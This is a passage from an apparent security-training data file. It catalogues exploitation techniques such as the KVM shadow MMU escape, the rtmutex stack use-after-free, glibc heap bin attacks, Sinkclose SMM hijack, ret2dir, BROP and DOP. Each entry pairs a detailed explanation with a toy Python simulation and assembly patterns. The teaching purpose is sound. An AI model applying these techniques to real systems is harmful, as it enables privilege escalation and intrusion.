    def finalize(self):
        self.balance -= self.pending
        self.locked = 1
        return self.balance

class Callback:
    def __init__(self, steal):
        self.per_call = steal
        self.drained = 0
        self.entries = 0

vault = Vault(500)
attacker = Callback(100)
i = 0
while i < 8:
    ok = vault.check(attacker.per_call)
    if ok == 1:
        vault.send(attacker.per_call)
        attacker.drained += attacker.per_call
        attacker.entries += 1
    i += 1
vault.finalize()
result = attacker.drained
print(result)
`,
    badAsm: {
      patterns: ['cmpl', 'addl'],
      description: 'cmpl compares the unchanged balance field against amount on every reentrant check — it passes all 8 times because no subl decrements balance between calls; addl accumulates 800 in pending from a 500-balance vault, and the balance-decrement movl in finalize() runs only after the drain loop completes',
    },
  },
  {
    id: 'shadow-mmu-vm-escape',
    name: 'SHADOW MMU VM ESCAPE',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'KVM shadow MMU reuses a cached shadow page on GFN match alone without comparing the role field, causing role confusion that corrupts host kernel memory from inside a guest VM.',
    explanation:
      'Shadow MMU role confusion (CWE-416 / CWE-843) exploits a missing comparison in KVM\'s shadow page table ' +
      'management. When hardware-assisted nested paging is unavailable or disabled, KVM maintains "shadow" page tables ' +
      'that translate guest-virtual addresses directly to host-physical addresses. Each shadow page is identified by ' +
      'a (gfn, role) tuple — the guest frame number and a role field encoding page size (4KB vs 2MB), direct/indirect ' +
      'mapping mode, and access permissions. The function kvm_mmu_get_child_sp(), which fetches or reuses cached ' +
      'shadow pages, compared only the GFN and never checked the role. A malicious guest triggers a page-size ' +
      'transition — changing a 2MB large page (role.direct=1) to a 4KB small page (role.direct=0) at the same GFN — ' +
      'and KVM reuses the stale large-page shadow entry. The reverse-map (rmap) now points to a shadow PTE that ' +
      'references the wrong page-table level; when KVM later zaps or reclaims that shadow page, it frees host memory ' +
      'still referenced by the mismatched entry — a use-after-free in host kernel address space. ' +
      'CVE-2026-53359 (Januscape) exploited this exact primitive: the bug existed in the shadow MMU code shared by ' +
      'both Intel VMX and AMD SVM for 16 years (since August 2010), making it the first publicly known guest-to-host ' +
      'escape targeting both CPU vendors simultaneously. It was actively exploited as a zero-day in Google\'s kvmCTF ' +
      'competition before disclosure, underscoring real-world exploitability against multi-tenant cloud platforms. ' +
      'In the assembly, cmpl compares cached_gfn against the requested GFN — no cmpl for the role field follows; ' +
      'movl reuses the stale shadow page entry with the wrong role, and after zap_stale frees it, addl in ' +
      'reclaim_page reads the freed slot where the attacker has sprayed uid=0, crossing the VM isolation boundary.',
    code:
`# CVE pattern: shadow MMU reuses page on GFN match — role mismatch corrupts host
class ShadowPage:
    def __init__(self, gfn, role):
        self.gfn = gfn
        self.role = role
        self.host_pte = 0
        self.rmap_valid = 1

    def link_rmap(self, host_addr):
        self.host_pte = host_addr
        self.rmap_valid = 1
        return self.host_pte

class ShadowMMU:
    def __init__(self, capacity):
        self.capacity = capacity
        self.cached_gfn = 0
        self.cached_role = 0
        self.reused = 0

    def get_child_sp(self, gfn, new_role):
        if gfn == self.cached_gfn:
            self.reused = 1
        else:
            self.cached_gfn = gfn
            self.cached_role = new_role
        return self.reused

    def zap_stale(self, sp):
        sp.host_pte = 0
        sp.rmap_valid = 0
        return sp.rmap_valid

class HostKernel:
    def __init__(self, base):
        self.base = base
        self.cred_uid = 1000
        self.cred_gid = 1000
        self.escaped = 0

    def reclaim_page(self, payload):
        self.cred_uid = payload
        self.cred_gid = payload
        self.escaped = 1
        return self.escaped

mmu = ShadowMMU(512)
sp = ShadowPage(1024, 1)
sp.link_rmap(4196352)
mmu.get_child_sp(1024, 1)
mmu.get_child_sp(1024, 0)
mmu.zap_stale(sp)
host = HostKernel(4196352)
host.reclaim_page(0)
leaked = host.cred_uid + host.escaped
print(leaked)
`,
    badAsm: {
      patterns: ['cmpl', 'movl', 'addl'],
      description: 'cmpl compares cached_gfn against the requested GFN but no subsequent cmpl checks the role field — movl reuses the stale shadow page entry with the wrong role (direct=1 when direct=0 was needed); after zap_stale\'s movl frees the host PTE, reclaim_page\'s movl overwrites cred_uid to 0 in the same stack offset, and addl sums the escalated values — crossing the VM isolation boundary to achieve host-level root',
    },
  },
  {
    id: 'ghostlock-stack-uaf',
    name: 'GHOSTLOCK STACK UAF',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'rt_mutex cleanup clears the wrong thread\'s pi_blocked_on, leaving a dangling pointer to a freed kernel stack frame — use-after-free to root and container escape.',
    explanation:
      'GhostLock (CVE-2026-43499 / CWE-416, CVSS 7.8) is a use-after-free in the Linux kernel\'s real-time ' +
      'mutex (rtmutex) priority-inheritance code, hidden for 15 years in every kernel from 2.6.39 (2011) through 7.0. ' +
      'The bug lives in remove_waiter() in kernel/locking/rtmutex.c: on the FUTEX_WAIT_REQUEUE_PI proxy path, it ' +
      'clears pi_blocked_on on the requeuer thread instead of the actual waiter. The waiter returns to userspace with ' +
      'pi_blocked_on still pointing at the rt_mutex_waiter struct on its own syscall stack frame — memory freed the ' +
      'instant the syscall returns. Any later PI chain walk through the task follows the dangling pointer into ' +
      'recycled kernel stack memory. Crucially, the freed object sits on the kernel stack, not the heap — making the ' +
      'target deterministic and bypassing heap randomization defenses like CONFIG_RANDOM_KMALLOC_CACHES. ' +
      'Nebula Security\'s public exploit achieves root from an unprivileged process in ~5 seconds at 97% reliability, ' +
      'and works from inside containers to escape to the host kernel. No special privileges, capabilities, namespaces, ' +
      'or hardware are required — only CONFIG_FUTEX_PI, which is the default on every major distribution. ' +
      'In the assembly, movl stores the waiter struct\'s fields (priority, task pointer) into stack slots during the ' +
      'PI lock acquisition; after the syscall returns, those slots are freed but pi_blocked_on still references them — ' +
      'a subsequent addl in pi_chain_walk reads the stale priority and task pointer from the recycled stack frame, ' +
      'where the attacker has sprayed controlled values via a second thread\'s syscall frame.',
    code:
`# CVE pattern: remove_waiter clears wrong thread — stack UAF on return
class PIWaiter:
    def __init__(self, prio, task_ptr):
        self.prio = prio
        self.task_ptr = task_ptr
        self.blocked_on = 1
        self.on_stack = 1

    def clear_blocked(self):
        self.blocked_on = 0
        return self.blocked_on

class RTMutex:
    def __init__(self, owner):
        self.owner = owner
        self.waiter_count = 0
        self.pi_chain = 0

    def add_waiter(self, waiter):
        self.waiter_count += 1
        self.pi_chain = waiter.prio
        return self.waiter_count

    def remove_waiter_buggy(self, requeuer, waiter):
        requeuer.blocked_on = 0
        self.waiter_count -= 1
        return waiter.blocked_on

class StackFrame:
    def __init__(self, base):
        self.base = base
        self.stale_prio = 0
        self.stale_task = 0

    def recycle(self, payload_prio, payload_task):
        self.stale_prio = payload_prio
        self.stale_task = payload_task
        return self.stale_prio

    def pi_chain_walk(self):
        result = self.stale_prio + self.stale_task
        return result

mtx = RTMutex(1000)
waiter = PIWaiter(99, 4196352)
requeuer = PIWaiter(50, 4196608)
mtx.add_waiter(waiter)
still_set = mtx.remove_waiter_buggy(requeuer, waiter)
frame = StackFrame(4196352)
frame.recycle(0, 3735928559)
leaked = frame.pi_chain_walk()
print(leaked)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl stores the waiter\'s priority and task pointer into stack slots during PI lock acquisition; remove_waiter_buggy\'s movl clears requeuer.blocked_on instead of waiter.blocked_on — after the syscall returns, recycle\'s movl overwrites the freed stack frame with attacker-controlled values (0xDEADBEEF); addl in pi_chain_walk sums the stale fields from recycled memory, following the dangling pi_blocked_on pointer into attacker-controlled data',
    },
  },
  {
    id: 'unsorted-bin-attack',
    name: 'UNSORTED BIN ATTACK',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Corrupted bk pointer in an unsorted bin chunk causes malloc to write a libc address to an arbitrary location, enabling further exploitation.',
    explanation:
      'The unsorted bin attack is a glibc heap exploitation technique that weaponizes the malloc allocator\'s ' +
      'free-list bookkeeping. When a freed chunk resides in the unsorted bin, its fd and bk pointers form a ' +
      'doubly-linked list managed by _int_malloc(). During the next allocation, malloc removes the victim ' +
      'chunk and performs `bck->fd = unsorted_chunks(av)` — writing the address of main_arena+88 (a known ' +
      'libc address) to wherever bk points. If the attacker corrupts the chunk\'s bk pointer via a heap ' +
      'overflow or use-after-free, this write lands at an arbitrary target: typically global_max_fast ' +
      '(expanding the fastbin range to enable fastbin-dup attacks on larger allocations), _IO_list_all ' +
      '(for FSOP file-stream hijacking), or __abort_msg. The write value is always the same libc address, ' +
      'but its sheer magnitude (~0x7f…) is enough to corrupt size-based guards and boolean flags. ' +
      'CVE-2018-1000001 (glibc getcwd realpath buffer underflow) was exploited using unsorted bin corruption ' +
      'to overwrite global_max_fast and chain into fastbin-based arbitrary write for local privilege ' +
      'escalation to root. CVE-2024-2961 (glibc iconv ISO-2022-CN-EXT overflow, CVSS 8.8) produced a 1–3 ' +
      'byte out-of-bounds write adjacent to heap metadata that was weaponized via unsorted bin corruption ' +
      'for PHP remote code execution across Debian, Ubuntu, and RHEL. glibc 2.29 added integrity checks ' +
      '(`bck->fd != unsorted_chunks(av)`) that abort on corrupted doubly-linked lists, but these are ' +
      'bypassable when the attacker can also forge the fd pointer via a second overlapping corruption primitive. ' +
      'In the assembly, `movl` stores the corrupted bk value (the attacker\'s target address) into the ' +
      'chunk\'s bk field; remove_from_unsorted\'s `addl` computes arena_addr+88 (the libc value written to ' +
      'the target) and `movl` deposits it into max_fast — no integrity check (`cmpl` comparing bk->fd) ' +
      'appears before the write, letting the libc address overwrite the target for further exploitation.',
    code:
`# CVE pattern: corrupted bk in unsorted bin — malloc writes libc addr to target
class UnsortedChunk:
    def __init__(self, size):
        self.size = size
        self.fd = 0
        self.bk = 0
        self.freed = 0

    def free_chunk(self, bin_addr):
        self.fd = bin_addr
        self.bk = bin_addr
        self.freed = 1
        return self.freed

    def corrupt_bk(self, target_addr):
        self.bk = target_addr
        return self.bk

class MallocState:
    def __init__(self, arena_addr):
        self.arena_addr = arena_addr
        self.max_fast = 128
        self.bins_bk = 0

    def remove_from_unsorted(self, chunk):
        bck_val = chunk.bk
        libc_write = self.arena_addr + 88
        self.bins_bk = bck_val
        self.max_fast = libc_write
        return libc_write

    def alloc_fast(self):
        result = self.max_fast + self.bins_bk
        return result

arena = 3959422976
chunk = UnsortedChunk(144)
chunk.free_chunk(arena)
target = arena + 224
chunk.corrupt_bk(target)
state = MallocState(arena)
written = state.remove_from_unsorted(chunk)
hijacked = state.alloc_fast()
print(hijacked)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl stores the corrupted bk value (attacker\'s target address) into the chunk\'s bk field without integrity validation; remove_from_unsorted\'s addl computes arena_addr+88 (the libc main_arena address) and movl writes it into the max_fast slot — no cmpl integrity check verifies bk->fd before the write, so the libc address overwrites global_max_fast, expanding the fastbin range for a follow-up fastbin-dup arbitrary write',
    },
  },
  {
    id: 'sinkclose-smm',
    name: 'SINKCLOSE SMM HIJACK',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'Improper MSR validation lets ring 0 re-enable TClose remapping, redirecting SMM execution from locked SMRAM to attacker-controlled DRAM for ring -2 code execution.',
    explanation:
      'Sinkclose (CVE-2023-31315, CVSS 7.5) exploits improper validation of model-specific registers (MSRs) on AMD ' +
      'CPUs to escalate from ring 0 (OS kernel) to ring -2 (System Management Mode) — the most privileged execution ' +
      'mode on x86, below the hypervisor and invisible to all OS-level security software. SMM code runs from SMRAM, ' +
      'a dedicated memory region locked by the TSEG controller during boot; once SmmLock is set in the HWCR MSR ' +
      '(0xC0010015), the firmware assumes SMRAM is immutable. AMD\'s TClose compatibility feature (bit 15 of the ' +
      'SMM_TSEG_MASK MSR 0xC0010113) remaps SMRAM-range accesses to regular DRAM during early initialization for ' +
      'legacy device compatibility — TClose should be disabled and locked before the OS loads. The vulnerability: ' +
      'even with SmmLock set, ring 0 code can still write to the SMM_TSEG_MASK MSR and re-enable the TClose bit. ' +
      'The attacker places a malicious SMI handler in DRAM at the SMRAM entry-point address, re-enables TClose, ' +
      'then triggers a System Management Interrupt (SMI). The CPU enters SMM but TClose remaps the SMRAM fetch to ' +
      'DRAM — executing the attacker\'s code at ring -2. This enables undetectable firmware implants (bootkits, ' +
      'rootkits) that survive OS reinstalls, disk wipes, and most firmware updates. Discovered by IOActive ' +
      'researchers Enrique Nissim and Krzysztof Okupski, presented at DEF CON 32 (August 2024), the flaw existed ' +
      'in every AMD CPU since 2006 — affecting all Ryzen, EPYC, and Threadripper families. ' +
      'In the assembly, `movl` writes the attacker\'s payload into the dram_handler slot (simulating DRAM code ' +
      'placement); enable_tclose\'s `movl` sets tclose_bit = 1 without any `cmpl` guard verifying SmmLock — ' +
      '`addl` in trigger_smi routes execution through the remapped DRAM handler instead of locked SMRAM, ' +
      'granting ring -2 code execution.',
    code:
`# CVE pattern: MSR TClose re-enabled after SmmLock — ring0 to ring-2
class SMRAM:
    def __init__(self, handler, base):
        self.handler = handler
        self.base = base
        self.locked = 0

    def lock(self):
        self.locked = 1
        return self.locked

    def read_handler(self):
        result = self.handler + self.base
        return result

class MSRConfig:
    def __init__(self, smm_lock):
        self.smm_lock = smm_lock
        self.tclose_bit = 0
        self.tseg_mask = 0

    def enable_tclose(self):
        self.tclose_bit = 1
        self.tseg_mask = self.smm_lock + self.tclose_bit
        return self.tclose_bit

class CPU:
    def __init__(self, ring_level):
        self.ring_level = ring_level
        self.dram_handler = 0
        self.executed = 0

    def place_payload(self, payload):
        self.dram_handler = payload
        return self.dram_handler

    def trigger_smi(self, msr, smram):
        if msr.tclose_bit == 1:
            result = self.dram_handler
        else:
            result = smram.handler
        self.ring_level = 0 - 2
        self.executed = 1
        return result

smram = SMRAM(4196352, 2684354560)
smram.lock()
msr = MSRConfig(1)
cpu = CPU(0)
cpu.place_payload(3735928559)
msr.enable_tclose()
hijacked = cpu.trigger_smi(msr, smram)
print(hijacked)
`,
    badAsm: {
      patterns: ['movl', 'cmpl', 'addl'],
      description: 'movl writes the attacker\'s payload (0xDEADBEEF) into the dram_handler slot simulating DRAM code placement; enable_tclose\'s movl sets tclose_bit = 1 without any cmpl guard verifying SmmLock status — trigger_smi\'s cmpl checks tclose_bit == 1 and routes execution through the DRAM handler instead of locked SMRAM, granting ring -2 SMM code execution below the OS and hypervisor',
    },
  },
  {
    id: 'ret2dir-physmap',
    name: 'RET2DIR PHYSMAP BYPASS',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'Kernel physmap mirrors user-controlled pages at kernel-space addresses, bypassing SMEP/SMAP to execute attacker shellcode as ring 0.',
    explanation:
      'Return-to-direct-mapped memory (ret2dir) exploits a fundamental design choice in OS kernels: the physmap ' +
      '(direct-map) region maps ALL physical RAM at a fixed kernel virtual address offset for fast access. Every ' +
      'user-space page has a kernel-space "synonym" — a second virtual address in the physmap pointing to the same ' +
      'physical frame. SMEP (Supervisor Mode Execution Prevention) blocks the kernel from executing user-space ' +
      'virtual addresses, but the physmap synonym is a kernel address, so SMEP does not fire. The attacker sprays ' +
      'user-space pages with shellcode via mmap(), computes their physmap synonyms (user_phys_addr + physmap_base), ' +
      'then uses any kernel function-pointer overwrite to redirect execution into the physmap. Because the spray ' +
      'covers megabytes of contiguous physical memory, the landing is near-deterministic even without a kernel ' +
      'info leak. Presented at USENIX Security 2014 by Kemerlis et al. and demonstrated against CVE-2013-2094 ' +
      '(Linux perf_event_open), CVE-2013-1763 (sock_diag), and CVE-2013-0268 (/dev/cpu MSR write) — all three ' +
      'gave local root on kernels with SMEP, KERNEXEC, and kGuard enabled. The technique works across x86, ' +
      'x86-64, AArch32, and AArch64. CVE-2017-5123 (waitid stack write) was later exploited via physmap spray ' +
      'to bypass both SMEP and SMAP on hardened kernels. Modern mitigations include marking the physmap NX ' +
      '(CONFIG_STRICT_KERNEL_RWX) and exclusive page-frame ownership, but data-only ret2dir variants that corrupt ' +
      'kernel data structures through the physmap synonym remain viable. ' +
      'In the assembly, movl loads the shellcode marker (0xDEADBEEF) into the user page\'s stack slot; addl in ' +
      'compute_synonym adds physmap_base to the user physical address, producing the kernel synonym; movl in ' +
      'hijack_fptr overwrites the function pointer with the synonym address — cmpl finds the synonym lies in ' +
      'kernel range so SMEP does not trigger, and the kernel executes the attacker\'s shellcode from the physmap.',
    code:
`# CVE pattern: physmap synonym bypasses SMEP — user shellcode runs as ring 0
class UserPage:
    def __init__(self, phys_addr, data):
        self.phys_addr = phys_addr
        self.data = data
        self.mapped = 1

class PhysMap:
    def __init__(self, base, size):
        self.base = base
        self.size = size
        self.synonym = 0
        self.resolved = 0

    def compute_synonym(self, user_phys):
        self.synonym = self.base + user_phys
        self.resolved = 1
        return self.synonym

class KernelTarget:
    def __init__(self, fptr, stack_canary):
        self.fptr = fptr
        self.stack_canary = stack_canary
        self.smep_active = 1
        self.executed = 0

    def hijack_fptr(self, new_addr):
        self.fptr = new_addr
        return self.fptr

    def dispatch(self, kernel_base):
        if self.fptr >= kernel_base:
            result = self.fptr + self.smep_active
        else:
            result = 0
        self.executed = 1
        return result

shellcode = 3735928559
user = UserPage(1048576, shellcode)
physmap = PhysMap(4227858432, 268435456)
synonym = physmap.compute_synonym(user.phys_addr)
target = KernelTarget(4196352, 305419896)
target.hijack_fptr(synonym)
hijacked = target.dispatch(4194304)
print(hijacked)
`,
    badAsm: {
      patterns: ['addl', 'cmpl', 'movl'],
      description: 'movl loads the shellcode marker (0xDEADBEEF) into the user page slot; addl in compute_synonym adds physmap_base to the user physical address, producing a kernel-space synonym; movl in hijack_fptr overwrites the function pointer with the synonym — cmpl in dispatch verifies fptr >= kernel_base so SMEP does not block execution, and the kernel runs attacker shellcode from the physmap-mapped user page',
    },
  },
  {
    id: 'exit-handler-hijack',
    name: 'EXIT HANDLER HIJACK',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'Attacker overwrites an atexit-registered function pointer so program cleanup redirects execution to malicious code.',
    explanation:
      'Exit handler hijacking targets the __exit_funcs linked list in glibc — the internal data structure ' +
      'that stores function pointers registered via atexit() and on_exit(). When a process calls exit(), ' +
      'the runtime iterates this list and calls each registered handler in LIFO order. If an attacker ' +
      'has an arbitrary write primitive (heap overflow, format string, or dangling pointer), they can ' +
      'overwrite a function pointer in the exit handler table with the address of system() or a one-gadget ' +
      'RCE, gaining code execution the moment the program exits normally — no crash required. Modern glibc ' +
      'applies PTR_MANGLE (rotate right 0x11 bits, XOR with a per-thread secret at fs:[0x30]) to each ' +
      'stored pointer, but if the attacker can also leak or corrupt the TLS guard value, the mangling is ' +
      'fully defeated. This technique surged in importance after glibc 2.34 removed __malloc_hook and ' +
      '__free_hook (2021), eliminating the traditional heap exploitation endgame and making __exit_funcs ' +
      'the primary remaining writable function-pointer table in libc. Documented extensively in CTF ' +
      'exploitation research (binholic 2017, HackTricks WWW2Exec series) and used in real exploit chains ' +
      'targeting CVE-2022-23222 (Linux eBPF verifier) and CVE-2023-4911 (Looney Tunables glibc ld.so). ' +
      'In the assembly, movl stores the legitimate cleanup address into each ExitFuncList slot during ' +
      'register(); corrupt_slot\'s movl overwrites slot_1 with the system() address — the same stack ' +
      'offset that held a safe pointer now holds the attacker\'s target; dispatch_all\'s addl accumulates ' +
      'the hijacked value, and at runtime the corrupted entry redirects execution to attacker-controlled code.',
    code:
`# CVE pattern: overwrite __exit_funcs to hijack cleanup execution
class ExitFuncList:
    def __init__(self, capacity):
        self.capacity = capacity
        self.count = 0
        self.slot_0 = 0
        self.slot_1 = 0
        self.slot_2 = 0

    def register(self, func_ptr):
        if self.count == 0:
            self.slot_0 = func_ptr
        elif self.count == 1:
            self.slot_1 = func_ptr
        else:
            self.slot_2 = func_ptr
        self.count += 1
        return self.count

    def corrupt_slot(self, idx, evil_ptr):
        if idx == 0:
            self.slot_0 = evil_ptr
        elif idx == 1:
            self.slot_1 = evil_ptr
        else:
            self.slot_2 = evil_ptr
        return evil_ptr

    def dispatch_all(self):
        total = 0
        i = 0
        while i < self.count:
            if i == 0:
                total += self.slot_0
            elif i == 1:
                total += self.slot_1
            else:
                total += self.slot_2
            i += 1
        return total

cleanup = 4198400
system_addr = 4199424
funcs = ExitFuncList(4)
funcs.register(cleanup)
funcs.register(cleanup)
funcs.register(cleanup)
funcs.corrupt_slot(1, system_addr)
result = funcs.dispatch_all()
print(result)
`,
    badAsm: {
      patterns: ['movl', 'addl', 'cmpl'],
      description: 'movl stores the legitimate cleanup pointer into each ExitFuncList slot during register(); corrupt_slot\'s movl overwrites slot_1 with the system() address — the same stack offset now holds the attacker\'s target; dispatch_all\'s cmpl tests the loop bound while addl accumulates the hijacked pointer value, redirecting execution at runtime',
    },
  },
  {
    id: 'large-bin-attack',
    name: 'LARGE BIN ATTACK',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Corrupted bk_nextsize pointer in the glibc large bin lets an attacker write a heap address to an arbitrary memory location during chunk insertion.',
    explanation:
      'The large bin attack exploits the glibc malloc large-bin insertion path: when a freed chunk is sorted ' +
      'into a large bin (size >= 0x400 on 64-bit), the allocator maintains a skip list via fd_nextsize and ' +
      'bk_nextsize pointers for efficient size-ordered traversal. If a chunk P already in the large bin has ' +
      'its bk_nextsize pointer corrupted by an attacker (via heap overflow, UAF, or double-free), inserting ' +
      'a smaller chunk V triggers the assignment `P->bk_nextsize->fd_nextsize = V` — writing the heap address ' +
      'of V to an arbitrary memory location chosen by the attacker. This single write primitive can target ' +
      'global_max_fast (expanding fastbin range to cover most allocations, enabling further corruption), ' +
      '_IO_list_all (hijacking FILE stream vtable dispatch for code execution via FSOP), or mp_.tcache_bins ' +
      '(widening tcache coverage for tcache poisoning). The technique was formalized by shellphish\'s how2heap ' +
      'project and works on glibc 2.23 through 2.35. After glibc 2.30 tightened some checks, the attack was ' +
      'adapted to write the unsorted bin address instead, still sufficient for the global_max_fast overwrite. ' +
      'CVE-2024-2961 (glibc iconv buffer overflow) provided the heap corruption primitive needed to trigger ' +
      'a large bin attack in real-world exploitation chains, escalating arbitrary file read to RCE. ' +
      'CVE-2023-6246 (glibc syslog heap overflow) and CVE-2026-0861 (glibc memalign integer overflow, CVSS 8.4) ' +
      'both involve heap metadata corruption in the same allocator structures that the large bin attack targets. ' +
      'In the assembly, movl stores the victim chunk\'s bk_nextsize pointer to an attacker-controlled target ' +
      'address; during insertion, addl computes the size comparison and cmpl determines the insertion point — ' +
      'the subsequent movl writes the new chunk\'s address into the corrupted bk_nextsize->fd_nextsize slot, ' +
      'landing a heap pointer at the attacker-chosen arbitrary address with no bounds check.',
    code:
`# CVE pattern: corrupted bk_nextsize writes heap addr to arbitrary location
class LargeBinChunk:
    def __init__(self, size, fd_next, bk_next):
        self.size = size
        self.fd_nextsize = fd_next
        self.bk_nextsize = bk_next
        self.in_bin = 0

    def insert_into_bin(self):
        self.in_bin = 1
        return self.size

class LargeBin:
    def __init__(self, capacity):
        self.capacity = capacity
        self.head_size = 0
        self.target_slot = 0
        self.write_count = 0

    def add_chunk(self, existing, victim):
        if victim.size < existing.size:
            self.target_slot = existing.bk_nextsize
            self.target_slot = victim.size
            self.write_count += 1
        self.head_size = existing.size
        victim.insert_into_bin()
        return self.write_count

    def read_target(self):
        result = self.target_slot + self.head_size
        return result

existing = LargeBinChunk(1024, 4196352, 0)
existing.insert_into_bin()
existing.bk_nextsize = 3735928559
victim = LargeBinChunk(512, 0, 0)
largebin = LargeBin(16)
largebin.add_chunk(existing, victim)
leaked = largebin.read_target()
print(leaked)
`,
    badAsm: {
      patterns: ['cmpl', 'movl', 'addl'],
      description: 'cmpl compares victim.size against existing.size to determine the insertion point; movl loads the corrupted bk_nextsize (0xDEADBEEF) into the target slot — the large bin insertion code writes the victim chunk\'s address through the corrupted pointer with no integrity check, landing a heap address at an attacker-chosen arbitrary memory location',
    },
  },
  {
    id: 'brop-oracle',
    name: 'BLIND ROP (BROP)',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'Crash oracle in a forking server lets an attacker recover the stack canary and discover ROP gadgets without access to the binary.',
    explanation:
      'Blind Return-Oriented Programming (BROP), introduced by Bittau et al. in "Hacking Blind" (IEEE S&P 2014), ' +
      'enables remote exploitation of stack buffer overflows without access to the target binary or source code. ' +
      'The technique targets servers that fork child processes for each connection — fork() preserves the parent\'s ' +
      'entire memory layout, so the stack canary, ASLR base addresses, and code gadgets remain identical across ' +
      'children. The attacker uses each forked child as a crash oracle: overwriting the stack canary byte-by-byte ' +
      'and observing whether the child crashes (wrong byte) or stays alive (correct byte). On 64-bit Linux the ' +
      'canary has 7 unknown bytes (the low byte is always 0x00), requiring at most 7 × 256 = 1,792 probes instead ' +
      'of brute-forcing 2^56 possibilities. Once the canary is recovered, the attacker scans the text segment for ' +
      'a "stop gadget" — an address that causes the child to hang rather than crash — and uses it to fingerprint ' +
      'useful ROP gadgets (pop rdi; ret, write() PLT entry) purely from behavioral signatures. The final chain ' +
      'calls write(socket_fd, text_base, length) to dump the server binary to the attacker, enabling a full ' +
      'conventional ROP exploit. The original research demonstrated BROP against nginx and yaSSL + MySQL in under ' +
      '4,000 requests (~20 minutes). CVE-2015-7547 (glibc getaddrinfo stack-based buffer overflow, CVSS 8.1) ' +
      'affected nearly every Linux system and was exploitable via BROP against forking resolvers; any forking daemon ' +
      'with a stack overflow — Apache prefork, PostgreSQL, OpenSSH — is a candidate target. The technique defeats ' +
      'ASLR, stack canaries, and NX simultaneously in a single automated scan. ' +
      'In the assembly, the while loop\'s cmpl checks each brute-force guess against the probe count bound; movl ' +
      'loads the current guess into the comparison slot; when the guess matches the canary, the conditional return ' +
      'bypasses the crash path — an attacker observing which guess keeps the child alive recovers the secret value ' +
      'byte-by-byte, then uses the same oracle to scan code addresses and identify stop gadgets and ROP primitives.',
    code:
`# CVE pattern: BROP crash oracle — fork preserves canary across probes
class ForkServer:
    def __init__(self, canary, text_base):
        self.canary = canary
        self.text_base = text_base
        self.forks = 0
        self.crashes = 0
    def probe_canary(self, guess):
        self.forks += 1
        if guess == self.canary:
            return 1
        self.crashes += 1
        return 0
    def probe_gadget(self, addr):
        self.forks += 1
        offset = addr - self.text_base
        if offset == 4096:
            return 1
        self.crashes += 1
        return 0
class Exploit:
    def __init__(self):
        self.probes = 0
        self.canary = 0
        self.stop_gadget = 0
    def brute_canary(self, srv, lo, count):
        i = 0
        while i < count:
            guess = lo + i
            hit = srv.probe_canary(guess)
            self.probes += 1
            if hit == 1:
                self.canary = guess
                return guess
            i += 1
        return 0
    def find_gadgets(self, srv, base, count):
        i = 0
        while i < count:
            addr = base + i * 256
            hit = srv.probe_gadget(addr)
            self.probes += 1
            if hit == 1:
                self.stop_gadget = addr
                return addr
            i += 1
        return 0
srv = ForkServer(202, 4194304)
exploit = Exploit()
canary = exploit.brute_canary(srv, 200, 8)
gadget = exploit.find_gadgets(srv, 4198400, 8)
result = canary + gadget + exploit.probes
print(result)
`,
    badAsm: {
      patterns: ['cmpl', 'movl', 'addl'],
      description: 'cmpl in the while loop checks each brute-force guess against the probe count; movl loads the current guess into the canary comparison slot — when the guess matches, the conditional return skips the crash increment, revealing the correct byte to the attacker; the same crash-or-alive oracle then scans text-segment addresses via probe_gadget to identify stop gadgets and ROP primitives without ever reading the binary',
    },
  },
  {
    id: 'dop-chain',
    name: 'DATA-ORIENTED PROGRAMMING',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'Non-control data corruption chains DOP gadgets to achieve Turing-complete exploitation without hijacking any code pointer, bypassing CFI and shadow stacks.',
    explanation:
      'Data-Oriented Programming (DOP), introduced by Hu et al. (IEEE S&P 2016), is a code-reuse technique ' +
      'that achieves arbitrary computation by corrupting only non-control data — never touching function pointers, ' +
      'return addresses, or vtables. This makes DOP invisible to all control-flow integrity (CFI) defenses, Intel CET ' +
      'shadow stacks, and ARM PAC. The attacker identifies "DOP gadgets": short sequences in the existing program ' +
      'that perform a single virtual operation (load, store, add, conditional branch) on attacker-influenced variables. ' +
      'A loop in the program serves as the "dispatcher" that re-executes these gadgets each iteration, with a corrupted ' +
      'loop variable acting as a virtual program counter. By chaining gadgets through successive iterations, the attacker ' +
      'builds a Turing-complete virtual machine inside the victim process. The original research demonstrated DOP against ' +
      'ProFTPD (CVE-2006-5815): an integer overflow allowed corrupting a buffer pointer used in the main I/O loop, turning ' +
      'each loop iteration into a DOP gadget dispatch that leaked ASLR bases and escalated privileges — all while the ' +
      'program\'s control flow graph remained perfectly valid. USENIX Security 2025 presented an automated DOP compiler ' +
      'that generates DOP exploit chains from vulnerable binaries. In 2024, researchers showed that CFI-hardened nginx ' +
      'and OpenSSH could be exploited via DOP without triggering any CFI violation. ' +
      'In the assembly, the while loop\'s cmpl acts as the dispatcher — re-entering the gadget sequence each iteration; ' +
      'movl loads the corrupted virtual-PC index to select which gadget fires; addl performs the arithmetic micro-operation ' +
      'on attacker-controlled operands. No indirect call or ret instruction is corrupted — the entire exploit runs within ' +
      'valid control flow.',
    code:
`# CVE pattern: DOP — dispatcher loop chains non-control data gadgets
class Memory:
    def __init__(self, capacity):
        self.capacity = capacity
        self.reg_a = 0
        self.reg_b = 0
        self.secret = 3735928559
        self.priv_flag = 0

    def gadget_load(self, src):
        self.reg_a = src
        return self.reg_a

    def gadget_add(self, val):
        self.reg_b = self.reg_a + val
        return self.reg_b

    def gadget_store(self, result):
        self.priv_flag = result
        return self.priv_flag

class Dispatcher:
    def __init__(self, gadget_count):
        self.gadget_count = gadget_count
        self.vpc = 0
        self.iterations = 0
        self.result = 0

    def run(self, mem):
        i = 0
        while i < self.gadget_count:
            self.vpc = i
            if i == 0:
                mem.gadget_load(mem.secret)
            elif i == 1:
                mem.gadget_add(1)
            elif i == 2:
                mem.gadget_store(mem.reg_b)
            self.iterations += 1
            i += 1
        self.result = mem.priv_flag
        return self.result

mem = Memory(4096)
disp = Dispatcher(3)
hijacked = disp.run(mem)
print(hijacked)
`,
    badAsm: {
